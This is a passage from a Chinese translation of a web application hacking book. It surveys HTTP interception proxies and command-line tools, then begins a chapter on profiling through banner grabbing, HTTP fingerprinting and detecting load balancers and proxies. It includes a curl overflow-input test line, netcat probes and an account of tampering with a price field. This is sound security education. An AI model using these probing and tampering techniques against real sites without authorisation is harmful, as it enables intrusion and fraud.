免费 HTTP 代理软件。它对操纵 HTTP 请求非常拿手，但在写这本书的时候，它的篡改 HTTPS 的能力还只限于 SSL 握手，还不能涉及数据。Fiddler 只能运行在 Windows 上，并要求采用微软的 .NET 框架 1.1 或更新的版本，

Fiddler 的界面分为三个窗格：在左边的是 Fiddler 截获的会话列表；右上的窗格包含了请求的详细信息；而下方则显示了对响应数据的追踪。当在扩展后的浏览器里正常浏览页面时，Fiddler 在左边窗格里记录了每一个请求和响应（两者会作为一个会话包含在同一行中）。当单击会话时，右面窗格会显示请求和响应的详细信息。

注意 Fiddler 自动使用它的本地代理来配置 IE,但像 Firefox 这样的其他浏览器可能需要手工配置成 localhost:8888。

为了篡改请求和响应，需要开启 Fiddler 的 “断点” 功能，该功能可以通过 “规则” 菜单下 “自动断点” 项启用。Fiddler 的断点功能与 Paros 的 “捕获”（trap）功能和 WebScarab 的 “截获”（intercept）功能有点相似。默认情况下断点是被禁止的，可以设置为在每个请求前或每个响应后自动产生。通常我们设置为在请求前中断，这可以使得浏览器在每个请求前暂停，而 Fiddler 会话列表中的最后一项会话以红色高亮标记出来。如果选择这个会话，一个新的鲜红色亮条会在右边的请求和响应窗格之间出现。这个亮条带有两个按钮，可以控制会话的后续流程：“响应后中断” 或 “运行至完成”。

现在你可以在单击这两个按钮前篡改请求中的任何数据，然后再提交修改后的请求。图 1-9 显示了 Fiddler 在篡改我们的老朋友——Bayden 系统的沙盒在线购物应用程序的 “Cost” 字段。我们再一次获得了所购商品的特别折扣价。

 </div>

综合说来，我们同样喜欢 Fiddler 灵巧的功能，比如默认限制本地代理只能用在外出流量的能力。Fiddler 同样支持脚本来自动标记和编辑 HTTP 请求/响应。你可以编写 .NET 代

码来调整 HTTP 管道里的请求和响应，你也可以使用任何 .NET 语言编写和加载自定义的监测对象，只要把编译好的 .DLL 文件拖到 \\Fiddler\\Inspectors 目录下，然后重启 Fiddler 就可以了。如果你想使用非 Java 的 HTTP 代理，Fiddler 应该是你的首选或第二选择。一旦它加入了对 HTTPS 的全面支持，几乎没有什么工具可以和它竞争了。直到现在，Fiddler 仍需要通过其他一些我们已经讨论过的、支持 HTTPS 的工具合作（比如，TamperIE 或 LiveHTTPHeaders）来增强它的功能。

##### Burp Intruder

Burp Intruder 是基于 Java 的 HTTP 代理工具，它带有很多 Web 应用安全测试的功能。其演示版本可以作为 Burp 工具包的一部分免费获得，但带有速度限制和功能限制。而一个独立的专业版需要 99 欧元。

Burp Intruder 的概念模型对初学者来说并不是那么直观，但如果你愿意花费精力去搞清楚它，就会发现它的确提供了一些有趣的功能。它的基本功能是基于预先设置的请求结构，反复进行攻击。请求结构原则上是要通过手工分析应用程序来获得的。一旦请求结构在 Burp Intruder 中配置好了，单击位置面板可以让你确定将不同的攻击载荷插入到哪个位置上，然后再到载荷面板中配置每个载荷的内容。Burp Intruder 提供了几种封装好的载荷，包括溢出测试载荷，它一直反复增加字符块和非法的 Unicode 编码输入。

一旦设置好位置和载荷，就可以启动 Burp Intruder 了。它野蛮地反复进行攻击，在每个设置的位置插入载荷，记录其响应。图 1-10 显示了使用 Burp Intruder 进行溢出测试的结果。

 </div>

使用响应忽略模式，Burp Intruder 将非常适合模糊测试（fuzz-testing，见第 12 章）和拒绝服务测试（denial-of-service，见第 11 章），但是它并不十分适合更加精确的攻击，比如需要插入单独的数据，特别是插入的数据需要精心设计的时候。在第 13 章中我们会再次分析 Burp，演示其大范围自动攻击的威力。

##### Watchfire PowerTools

这是 Watchfire 公司的多功能免费工具集，包括 HTTP 代理、连接测试器、HTTP 请求编辑器、表达式测试器，以及编码/解码组件。

HTTP Watchfire 代理基于 Java，运行它需要 JRE 5 或者更新的版本。这个代理工具默认在 8080 端口上运行，可以透明地处理 HTTPS。它使用起来很方便——有三种模式：智能模式、自动模式和手动模式。默认的模式是自动模式，在该模式下，所有浏览器的请求和响应都自动穿过代理，使得没有时间手工分析或伪造数据。设置为手动模式后，每个请求和响应都需要通过工具底部的按钮，手动确认通过。因为很多 Web 应用程序会通过非常多常规请求（比如图片等），每个请求都需要手动放行很快会使人感到厌烦。智能模式处于这两种极端情况的中间，它自动放行不重要的请求而暂停重要的请求，如果没有这一点，Watchfire HTTP 代理和提到的其他工具相比，是不具备竞争力的。

#### 1.4.4 命令行工具

这里是我们很喜欢使用的两个命令行工具，它们非常擅长进行类似脚本和迭代的攻击。

##### Curl

Curl 是一个免费的多平台下的命令行工具，可以操作 HTTP 和 HTTPS。当需要编制脚本进行迭代分析时，Curl 是非常强大的。我们会在第 5 章和第 6 章中进行演示。下面是一个简单的缓冲区溢出的输入测试例子，它用 Perl 建立字符串，并基于 Curl 运行：

$ curl https://website/login.php?user=`perl -e 'print "a" x 500'`

##### Netcat

Netcat 被称为网络攻击中的“瑞士军刀”，因为它可以出色地完成很多任务。可能你已经从它的名字 Netcat 中猜到了，它和 UNIX 下输出文件内容的 Cat 工具有些类似。关键的不同是 Netcat 对网络连接完成其同样的功能：将网络通信的原始输入和输出导出到命令行。我们在本章前面的一个例子中，用 Netcat 演示了一个简单的 HTTP 请求。

提示：可以使用重定向字符(<)将文本文件的内容输入到 Netcat 连接中，比如: nc -vv server 80 <file.txt。我们会在第 2 章中谈到在 UNIX/Linux 平台上编制 Netcat 脚本的一些简单方法。

虽然小巧实用，但涉及到 Web 应用程序时 Netcat 需要许多手工的操作，因为毕竟它只是一个原始的网络工具。比如，如果目标服务器采用了 HTTPS，那就需要在 Netcat 前使用像 SSLProxy，Stunnel 或 Openssl 之类的工具（这些工具的链接参考本章中的“参考和进一步阅读”）。在本章中我们已经看到，这里有很多工具可以自动处理基本的 HTTP/S 事务，但使用 Netcat 时，则需要手工的处理。一般来说，当进行 Web 应用安全测试时，我们更推荐使用本章中讨论的其他工具。

#### 1.4.5 一些老工具

大量的 HTTP 攻击工具不断出现、流行，然后退出历史舞台。我们过去常使用的一些工具包括：Achilles，@Stake WebProxy，Form Scalpel，WASAT（Web Authentication Security Analysis Tool），以及 WebSleuth.。这些工具的老板本仍然可以在 Internet 上获得，但在一般情况下，更新的工具功能会更好，因此我们推荐先试试更新的工具。

### 1.5 小结

在本章中，我们浏览了整个 Web 应用攻击的工具和技术，在本书的剩下部分中，我们会对每个方法进行详细的讨论。

系好你的安全带，Dorothy，因为就要和堪萨斯州说再见，开始我们的神奇之旅了！——《绿野仙踪》

### 1.6 参考和进一步阅读

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>参 考</td><td style='text-align: center; word-wrap: break-word;'>链 接</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Web 浏览器</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Internet Explorer</td><td style='text-align: center; word-wrap: break-word;'>http://www.microsoft.com/windows/ie/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Firefox</td><td style='text-align: center; word-wrap: break-word;'>http://www.mozilla.com/firefox/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>规范</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>RFC Index Search Engine</td><td style='text-align: center; word-wrap: break-word;'>http://www.rfc-editor.org/rfcsearch.html</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>HTTP 1.0</td><td style='text-align: center; word-wrap: break-word;'>RFC 1945</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>HTTP 1.1</td><td style='text-align: center; word-wrap: break-word;'>RFC 2616</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>W3C HyperText Markup Language</td><td style='text-align: center; word-wrap: break-word;'>http://www.w3.org/MarkUp/</td></tr></table>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>Home Page</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Uniform Resource Identifiers (URI):</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Generic Syntax</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>HTTPS</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SSL (Secure Sockets Layer)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>TLS (Transport Layer Security)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>eXtensible Markup Language (XML)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>WSDL</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>UDDI</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SOAP</td></tr></table>

##### 通用的参考

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>OWASP Top 10</td><td style='text-align: center; word-wrap: break-word;'>http://www.owasp.org/documentation/topten.html</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Microsoft ASP</td><td style='text-align: center; word-wrap: break-word;'>http://msdn.microsoft.com/library/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>psdk/iisref/aspguide.htm</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Microsoft ASP.NET</td><td style='text-align: center; word-wrap: break-word;'>http://www.asp.net/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Hypertext Preprocessor (PHP)</td><td style='text-align: center; word-wrap: break-word;'>http://www.php.net/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Microsoft IIS</td><td style='text-align: center; word-wrap: break-word;'>http://www.microsoft.com/iis</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Apache</td><td style='text-align: center; word-wrap: break-word;'>http://www.apache.org/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Java</td><td style='text-align: center; word-wrap: break-word;'>http://java.sun.com/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>JavaScript</td><td style='text-align: center; word-wrap: break-word;'>http://www.oreillynet.com/pub/a/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>javascript/2001/04/06/js_history.html</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>IE Explorer Bar</td><td style='text-align: center; word-wrap: break-word;'>http://msdn.microsoft.com/library/default.asp?url=/library/en-us/shellcc/platform/Shell/programmersguide/shell_adv/bands.asp</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Open HTTP/S Proxies</td><td style='text-align: center; word-wrap: break-word;'>http://www.publicproxyservers.com/</td></tr></table>

IE 扩展

TamperIE

IEWatch

http://www.bayden.com/

http://www.iewatch.com

IE Headers

http://www.blunck.info/ iehttpheaders.html

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>IE Developer Toolbar</td><td style='text-align: center; word-wrap: break-word;'>Search http://www.microsoft.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>IE 5 Powertoys for WebDevs</td><td style='text-align: center; word-wrap: break-word;'>http://www.microsoft.com/windows/ie/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>previous/webaccess/webdevaccess.mspx</td></tr></table>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>Firefox 扩展</td><td style='text-align: center; word-wrap: break-word;'>http://livehttpheaders.mozdev.org/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>LiveHTTP Headers</td><td style='text-align: center; word-wrap: break-word;'>http://tamperdata.mozdev.org</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Tamper Data</td><td style='text-align: center; word-wrap: break-word;'>http://modifyheaders.mozdev.org</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Modify Headers</td><td style='text-align: center; word-wrap: break-word;'>http://modifyheaders.mozdev.org</td></tr></table>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td colspan="2">HTTP/S 代理工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Paros 代理</td><td style='text-align: center; word-wrap: break-word;'>http://www.parosproxy.org</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>WebScarab</td><td style='text-align: center; word-wrap: break-word;'>http://www.owasp.org</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Fiddler HTTP Debugging Proxy</td><td style='text-align: center; word-wrap: break-word;'>http://www.fiddlertool.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Burp Intruder</td><td style='text-align: center; word-wrap: break-word;'>http://portswigger.net/intruder/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Watchfire PowerTools</td><td style='text-align: center; word-wrap: break-word;'>http://www.watchfire.com/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>securityzone/product/powertools.aspx</td></tr></table>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td colspan="2">命令行工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Curl</td><td style='text-align: center; word-wrap: break-word;'>http://curl.haxx.se/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Netcat</td><td style='text-align: center; word-wrap: break-word;'>http://www.securityfocus.com/tools</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Sslproxy</td><td style='text-align: center; word-wrap: break-word;'>http://www.obdev.at/products/ssl-proxy/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Openssl</td><td style='text-align: center; word-wrap: break-word;'>http://www.openssl.org/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Stunnel</td><td style='text-align: center; word-wrap: break-word;'>http://www.stunnel.org/</td></tr></table>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td colspan="2">样例应用程序</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Bayden Systems 的 “沙盒” 在线购物应用程序</td><td style='text-align: center; word-wrap: break-word;'>http://www.bayden.com/sandbox/shop/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Foundstone Hacme 银行和 Hacme 图书</td><td style='text-align: center; word-wrap: break-word;'>http://www.foundstone.com（位于 Resource/Free Tools 下）</td></tr></table>

## 第 2 章 剖 析

剖析是用来研究和查明 Web 站点如何构架，以及它们的应用程序如何工作的策略。剖析是 Web 攻击中非常关键却常被忽视的部分。最有效的攻击要求事前做严格的准备工作，获取尽量多的关于应用程序内部工作的信息，包括站点上所有的 Web 网页、应用程序，以及输入/输出命令结构。

对剖析流程的认真重视程度以及花费在上面的时间，通常与整个站点的安全问题性质直接相关。这与脚本小子的评估有很大不同。脚本小子只能发现容易取得的果实，像简单的SQL注入或缓冲区溢出攻击。而剖析的目的是真正地刺探出应用程序的核心商业逻辑。

这里有许多工具和技术可以用于 Web 剖析。但阅读完本章后，你可以用自己的方法成为专家。我们关于剖析的讨论分为两个部分：

○ 架构剖析

☐ 应用剖析

我们之所以选择这样的组织结构，是因为这两种剖析类型在思想、方法和结果方面或多或少有些不同。架构剖析着重在 Web 应用程序的相对不变的现成（off-the-shelf）组件上（我们在这里放宽了“现成”的定义，包括常见重用软件的所有形式，也包括免费软件，开源软件和商业软件）。通常情况下，这些组件的漏洞很容易被识别和利用。另一方面，应用剖析讨论独立的、高度自定制的 Web 应用程序的独特结构和功能。应用程序的漏洞可能非常微妙，需要进行深入的研究才能检测和利用。因此不必惊讶，我们关于应用剖析的讨论占据了本章的大部分篇幅。

在本章的结尾，我们将对常见剖析策略的通用对抗措施进行简短的讨论。

### 2.1 架构剖析

Web 应用需要底层架构的支持——Web 服务器硬件/软件、DNS 入口、网络设备、负载

均衡器等等。因此，任何好的 Web 安全评估方法，首先都是识别和分析应用程序所位于的底层架构的。

#### 2.1.1 踩点和扫描：定义范围

在第 1 版的《黑客大曝光》中，引入了踩点（footprinting）的概念，即，使用各种基于 Internet 的调查方法，来确定目标应用程序或组织的范围。有很多传统工具和方法可以执行该工作，包括：

☐ 注册调查

☐ DNS 查询

☐ 常规的组织结构调查

第 1 版的《黑客大曝光》方法学也涵盖了基础的架构探测技术，比如：

☐ 服务器发现（ping 扫描）

☐ 网络服务识别（端口扫描）

大多数基于 World Wide Web 的应用程序，都是在规范的端口上运行的，比如，HTTP 在 TCP 80 端口，HTTPS/SSL/TLS 在 TCP 443 端口。因此，一旦目标的 URL 被确定了，通常就不再需要使用这些探测技术了。更细心的攻击者可能会使用常见 Web 服务器的端口列表，对目标 IP 范围进行扫描，以发现在不常见端口运行的 Web 应用。

提示 针对基于 Web 管理端口的常见攻击和对抗措施的讨论，请参见第 10 章。

警告 不要忽略了端口扫描。许多 Web 应用程序就是因为在服务器或者 DMZ 中与 Web 应用服务器相连的其他服务器上运行了不适当的服务而受到攻击的。

我们并非详细地重复列举出那些只和 Web 应用评估部分相关的方法学，而是为对深入讨论感兴趣的用户推荐“黑客大曝光”系列（Hacking Exposed）的其他图书（参见本章末尾的“参考和进一步阅读”获得更多信息）。接下来，我们将讲述与 Web 应用更直接相关的架构剖析方面的内容。

### 2.1.2 Banner 抓取

底层架构剖析的下一步骤通常是 Banner 抓取（banner grabbing）。Banner 抓取对于 Web 黑客来说是很关键的，因为它通常可以确定目标 Web 服务器软件的类型及版本。HTTP 1.1 规范（RFC 2616）定义了服务器响应头字段，用来传送关于服务器处理请求的信息。虽然 RFC 鼓励实现者为了安全，将该字段做成一个可配置的选项，但几乎当前所有的实现，在

默认情况下都使用真实的数据填充该字段（但我们马上会谈到这条规则的几种例外）。

提示 如果选择的端口扫描器支持 Banner 抓取，那么 Banner 抓取可与端口扫描同时进行。

下面是利用 Netcat 工具抓取 banner 的一个例子。

D:\>nc -nvv 192.168.234.34 80
(UNKNOWN) [192.168.234.34] 80 (?) open
HEAD / HTTP/1.0
[Two carriage returns]
HTTP/1.1 200 OK
Server: Microsoft-IIS/5.0
Date: Fri, 04 Jan 2002 23:55:58 GMT
[etc.]

注意这里使用的是 HEAD 方法来获取服务器 banner，这是 banner 抓取的最简单方法。

在第 1 章中已经列出了一些我们更常使用的更容易操纵 HTTP 的工具。这里使用 Netcat 是为了更清楚地阐明原始的输入-输出。

#### 2.1.3 高级 HTTP 指纹

在过去，知道了 Web 服务器的类型和版本，只要向 Google 或 Bugtraq 提交服务器基本信息，就足以确定是否有相关的攻击代码（我们将在第 3 章中深入地讨论该流程）。但是，随着安全意识的提高，新的产品和技术通常去掉了明显的标志，它们要么阻止显示服务器信息，要么报告根本是虚假的信息，以甩掉攻击者的追踪。

但信息安全就像一场永无终止的军备竞赛，更精确的 banner 抓取技术已经出现，它可以用来确定实际运行的是什么 Web 服务器。我们把抓取 HTTP 相关版本的 Banner 称之为 Web 服务器指纹识别（fingerprinting），因为它不再是简单地查看头部的值，而是观察每种 Web 服务器的整体行为，以及各种 Web 服务器的独特响应。比如，一个 IIS 服务器和一个 Apache Web 服务器可能会对某个非法的 HTTP 请求返回不同的响应信息。这是确定 Web 服务器真实类型和版本非常好的方法，也是必须了解各种 Web 服务器间细微差别的重要原因。有很多方法可以确定 Web 服务器指纹，实际上，指纹识别是一门艺术，接下来我们会讨论几种基本的 Web 服务器指纹识别技术。

#### 不常见的 HTTP 请求方法

Web 服务器间最明显的不同，是它们对不同类型的 HTTP 请求的响应。请求越不常见，Web 服务器软件对该请求出现不同响应的可能性就越大。在接下来的例子中，我们再次使

用 Netcat 发送 PUT 请求，而不是典型的 GET 或 HEAD。在该 PUT 请求中没有数据。请注意，即使我们发送相同的非法请求，每个服务器的响应都有所不同。这使得我们在即使服务器 banner 被更改的情况下，也可以精确地确定出 Web 服务器的本来面目。响应中的不同之处在下例中以粗体表示了出来。

Sun One Web Server
$ nc sun.site.com 80
PUT / HTTP/1.0
Host: sun.site.com
HTTP/1.1 401 Unauthorized
Server: Sun-ONE-Web-Server/6.1
IIS 6.0
$ nc iis6.site.com 80
PUT / HTTP/1.0
Host: iis6.site.com
HTTP/1.1 403 Forbidden
Server: Microsoft-IIS/5.1
Apache 2.0.x
$ nc apache.site.com 80
PUT / HTTP/1.0
Host: apache.site.com
HTTP/1.1 411 Length Required
Server: Microsoft-IIS/6.0
Content-Type: text/html
IIS 5.x
$ nc iis5.site.com 80
PUT / HTTP/1.0
Host: iis5.site.com
HTTP/1.1 405 Method Not Allowed
Server: Apache/2.0.54

##### 服务器头的区别

仔细观察不同服务器响应中的 HTTP 头，你会发现有细微的区别。比如，有时头的顺序会不同，而有些服务器和其他的服务器相比有额外的头信息，这可以表明 Web 服务器的类型和版本。

比如，在 Apache 2.x 中，“Data: ”头位于最上面，恰好在“Server: ”头的上方，就像下面以粗体显示的一样。

Date: Mon, 22 Aug 2005 20:22:16 GMT
Server: Apache/2.0.54
Last-Modified: Wed, 10 Aug 2005 04:05:47 GMT
ETag: "20095-2de2-3fdf365353cc0"
Accept-Ranges: bytes
Content-Length: 11746
Cache-Control: max-age=86400
Expires: Tue, 23 Aug 2005 20:22:16 GMT
Connection: close
Content-Type: text/html; charset=ISO-8859-1

而在 IIS 5.1 中，正好和 Apache 2.0 相反，“Server: ”头位于最上面，在“Data: ”头的正上方。

HTTP/1.1 200 OK
Server: Microsoft-IIS/5.1
Date: Mon, 22 Aug 2005 20:24:07 GMT
X-Powered-By: ASP.NET
IIS 5.1
Connection: Keep-Alive
Content-Length: 6278
Content-Type: text/html
Cache-control: private

在 Sun One 中，“Data: ”头的顺序和 IIS 5.1 相同，但请注意其中的“Content-length: ”, “length”的首字母不是大写的，“Content-type: ”中的“type”也是这样。但在 IIS 5.1 中，它们都是大写的。

HTTP/1.1 200 OK
Server: Sun-ONE-Web-Server/6.1
Date: Mon, 22 Aug 2005 20:23:36 GMT
Content-length: 2628
Content-type: text/html
Last-modified: Tue, 01 Apr 2003 20:47:57 GMT
Accept-ranges: bytes
Connection: close

在 IIS 6.0 中，“Server:” 和 “Date:” 头的顺序和 Apache 2.0 相同，但是在它们之上有一个 “Connection:” 头。

HTTP/1.1 200 OK
Connection: close
Date: Mon, 22 Aug 2005 20:39:23 GMT
Server: Microsoft-IIS/6.0
X-Powered-By: ASP.NET
X-AspNet-Version: 1.1.4322
Cache-Control: private
Content-Type: text/html; charset=utf-8
Content-Length: 23756

http://print.工具

我们已经介绍了几种 HTTP 服务器指纹识别的相关技术。与手工使用这些技术相比，我们更推荐使用 Net-Square 的 httpprint 工具（其链接请参见本章末尾的“参考和进一步阅读”）。为了回避大多数服务器迷惑技术（obfuscation techniques），httpprint 使用了诸如检查 HTTP 头顺序等的大部分探测技术。它也带有可定制的 Web 服务器指纹数据库。在图 2-1 中显示了 httpprint 正在识别一些 Web 服务器的指纹。

 </div>

#### 2.1.4 中间件架构

一个可能会干扰剖析结果的问题，是 Web 服务器前方的中间件架构配置。中间件架构包括负载均衡器、虚拟服务器配置、代理和 Web 应用防火墙。下面，我们将讨论这些干扰如何影响到刚才讨论的那些指纹获取基本技术，我们也会讨论如何检测出它们。

##### 虚拟服务器

另一个需要考虑的问题是虚拟服务器。一些 Web 应用提供商，为了节约硬件成本，在一台机器上使用多个虚拟 IP 地址以运行不同的 Web 服务。因此，如果端口扫描的结果显示大量活跃的不同 IP 地址，其实有可能是同一台拥有多个虚拟 IP 地址的机器。

##### 检测负载均衡器

因为负载均衡器通常是不可见的，所以许多攻击者在测试时往往忽略了它们。但是负载均衡器可能会彻底改变你的测试方法。配置负载均衡器，用来保证不会有哪个服务器对请求过载，它通过把 Web 流量分流到多个服务器上来实现。比如，当你对一个 Web 站点发出一个请求，负载均衡器可能把你的请求分到四个服务器中的任意一个。这样的设置对你来说，就意味着对一个服务器有效的攻击，下一次被发送到别的服务器时，攻击就不再有效了。这可能会使你非常受挫和迷惑。虽然从理论上来说，攻击目标的所有服务器应该是完全相同的，各个服务器的响应都应该是一样的，但在现实世界中往往不是这么简单的。因为即使在各个服务器上的应用程序是一样的，其目录结构、补丁级别，以及设置在各台服务器上的配置都有可能不同。比如，可能在某台服务器上留有一个 test 目录，但在其他服务器上没有。这就是不要忽略了识别负载均衡器的重要原因。下面是探测在目标站点上是否运行了负载均衡器的方法。

在一个 IP 范围内做端口扫描: 一种发现负载均衡服务器的简单方法是首先确定主机别名服务器的 IP 地址, 然后利用脚本对周围的 IP 发送请求。我们看到这种技术得到几乎完全相同的响应, 这可能是经过负载均衡的完全相同的 Web 服务器。但是, 偶尔我们也会遇到一些服务器和其他服务器有所不同, 比如运行过时的软件版本, 或者有一些其他的服务诸如 SSH 或 FTP。认为这些服务器有某种安全错误配置通常是一桩好赌注, 可以通过它们的 IP 地址进行独立的攻击。

时间戳分析：一种检测负载均衡器的方法是分析响应时间戳。因为很多服务器可能没有同步它们的时间，你可以通过在一秒内发出多个请求，然后分析服务的时间头，来确定是否有多个服务器。如果你的请求被分到了多个服务器，那么返回的头部里的时间很可能是不同的。你需要多次进行测试以降低误警率，来发现真正的特点。如果你足够幸运，每个服务器都不同步，这样你可以推断出究竟有多少个服务器被平衡负载了。

Etag 与 Last-Modified 的差别：通过请求同样的资源，比较响应头中 Etag 和 Last-Modified 的值，你可以确定是否从多个服务器上得到了不同文件。举个例子来说，下面是多次请求 index.html 得到的响应。

ETag: "20095-2de2-3fdf365353cc0"
ETag: "6ac117-2c5e-3eb9ddfaa3a40"
Last-Modified: Sun, 19 Dec 2004 20:30:25 GMT
Last-Modified: Sun, 19 Dec 2004 20:31:12 GMT

这些响应的 Last-Modified 时间戳有所不同，说明这些服务器没有立即复制这些文件，所请求的资源大约一分钟之后才被复制到其他的服务器。

负载均衡器 Cookies: 一些代理服务器和负载均衡器在 HTTP 会话中添加了它们自己的 Cookie，以更好地保持状态。这一点也很容易被发现，因此如果你发现了不常见的 Cookie，你可以在 Google 中搜索它，从而确定其来源。比如，在浏览一个 Web 站点时，我们发觉下面这个 Cookie 被发送到了服务器。

 $$ \mathrm{AA002=1131030950-536877024/1132240551} $$ 

因为 Cookie 没有给出所属的应用的明显信息，我们在 Google 中搜索 “AA002=”，得到了多个使用该 Cookie 的站点。通过进一步的分析，我们发现该 Cookie 是一种被称为 “Avenue A” 的跟踪 Cookie。如果你不懂，就 Google 它，这是通常的做法。

枚举 SSL 差别：这是识别代理和负载均衡器的最后办法。如果你确定应用程序事实上是经过负载均衡的，但是上述方法又没有一个能起效，那么你可以试着看看站点的 SSL 证书是否有所不同，或者每个 SSL 证书的加密强度是否一致。比如，其中的一个服务器可能只支持 128 位的加密，因为安全级别要求它应该这么做，但是假设站点管理员忘记了应用该策略到其他服务器，就会导致其他服务器支持所有从 96 位到更高级别的加密。通过一个类似这样的错误，可以确认 Web 站点是经过负载均衡的。

检查 HTML 源代码：虽然我们会在本章随后的“应用剖析”一节中更深入地讨论这个问题，但意识到 HTML 源代码也会泄漏负载均衡器是很重要的。比如，对同样页面的多次请求可能会返回 HTML 源码的不同注释，下面就是一个例子，HTML 注释以“<！--”开始。

<！-- ServerInfo: MPSPPIIS1B093 2001.10.3.13.34.30 Live1 -->
<！-- Version: 2.1 Build 84 -->
<！-- ServerInfo: MPSPPIIS1A096 2001.10.3.13.34.30 Live1 -->
<！-- Version: 2.1 Build 84 -->

站点上的一个页面暴露了更多隐秘的 HTML 注释，经过 5 次取样取得的注释对比如下：

<! -- whfhUAXNByd7ATE56+Fy6BE9I3B0GKXUuZUW -->
<! -- whfh6FHHX2v8MyhPvMcIjUKE69m6OQB2Ftaa -->

<!-- whfhKMcA7HcYHmkmhrUbxWNXLgGblfF3zFnl -->
<!-- whfhuJEVisaFEIHTcMPwEdn4kRiLz6/QHGqz -->
<!-- whfhzsBySWYIwg97KBeJyqEs+K3N8zIM96bE -->

看起来好像是以“whfh”开始的带有 salt 的 MD5 散列值，不过我们还不确定。在接下来的“应用剖析”一节中，我们会更多地讨论如何获取和识别 HTML 注释。

#### Detecting Proxies 检测代理

有时你会发现你最感兴趣的目标看个见了。不必感到奇怪，像代理这样的设备对终端用户是透明的。但如果你能发现它们，这就是重要的攻击点。下面列出的一些方法可以用来确认目标站点是否通过代理来响应你的请求。

TRACE 请求: TRACE 请求告诉 Web 服务器回显刚才接收到的请求内容, 该命令作为调试工具加入到 HTTP 1.1 中。但是我们很幸运, 它还可以暴露出我们的请求在到达 Web 服务器之前是否经过代理服务器。发送一个 TRACE 请求, 则代理服务器会改变请求后发送到 Web 服务器, 而 Web 服务器将精确地回显它所接收到的请求。通过这种方法, 我们可以识别代理对请求做了什么样的更改。

代理服务器通常添加固定的头，因此可以查找类似下面这样的头：

"Via:", "X-Forwarded-For:", "Proxy-Connection: "
    TRACE / HTTP/1.1
    Host: www.site.com
    HTTP/1.1 200 OK
    Server: Microsoft-IIS/5.1
    Date: Tue, 16 Aug 2005 14:27:44 GMT
    Content-length: 49
    TRACE / HTTP/1.1
    Host: www.site.com
    Via: 1.1 192.168.1.5

当你的请求通过一个反向（reverse）的代理服务器时，你会得到不同的结果。反向代理是一个前后端代理，把来自 Internet 的请求转发到后端服务器。反向代理通常用两种方法改变请求。第一种方法，它们将 URL 重映射到内部服务器上对应的 URL，举个例子，“TRACE /folder1/index.aspx HTTP/1.1” 可能变成 “TRACE/site1/folder1/index.asp HTTP/1.1”。另一种改变方法把 “Host:” 头改变成适当的内部服务器，以转发请求到该服务器上。在下面这个例子中，你会发现 “Host:” 头被改变成了 “server1.site.com”。

HTTP/1.1 200 OK
Server: Microsoft-IIS/5.1
Date: Tue, 16 Aug 2005 14:27:44 GMT
Content-length: 49

TRACE / HTTP/1.1
Host: server1.site.com

Connect 标准测试：CONNET 命令被大多数代理服务器使用，用来代理 SSL 连接。利用该命令，代理会代表客户端使用 SSL 连接。举个例子，发送 “CONNECT https://secure.site.com:443” 会指示代理服务器在 443 端口采用 SSL 连接到 secure.site.com。如果该连接成功，CONNECT 命令会把用户的连接和安全连接一起封装起来。但是，当在内部网络使用该命令连接服务器时，该命令可能会被滥用。

